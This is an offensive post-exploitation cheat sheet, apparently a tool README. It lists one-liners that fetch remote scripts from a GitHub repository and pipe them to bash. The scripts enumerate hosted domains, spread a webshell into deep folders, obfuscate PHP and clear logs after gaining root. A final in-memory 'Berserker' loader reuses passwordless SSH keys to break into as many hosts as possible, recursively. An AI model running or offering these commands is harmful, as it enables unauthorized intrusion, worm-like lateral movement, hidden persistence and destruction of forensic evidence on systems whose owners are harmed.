netstat if there is no netstat/ss/lsof:
```sh
curl -fsSL https://raw.githubusercontent.com/oxygencall/tools/master/awk_netstat.sh | bash
```
Show all domains hosted on a server + system-information :
```sh
curl -fsSL https://raw.githubusercontent.com/oxygencall/tools/master/what_server.sh | bash
```
Spreading your webshell to the deepest destination folder 
```sh
wget https://raw.githubusercontent.com/oxygencall/tools/master/dor
```
Encrypt ur PHP Code
```php
php ob.php
```
Clear all logs if gain root
```sh
wget https://raw.githubusercontent.com/oxygencall/tools/master/clear.sh
```
The Berserker looks for password-less ssh-keys (such as ~/.ssh/id_rsa) and then attempts to log in to as many hosts as possible. It repeats its action recursively. All this without writing or installing any data on any host. It’s an in-memory infiltration only.
```sh
export BS="$(curl -fsSL https://raw.githubusercontent.com/oxygencall/tools/master/bs)" && bash -c "BS_DEPTH=1 $BS"
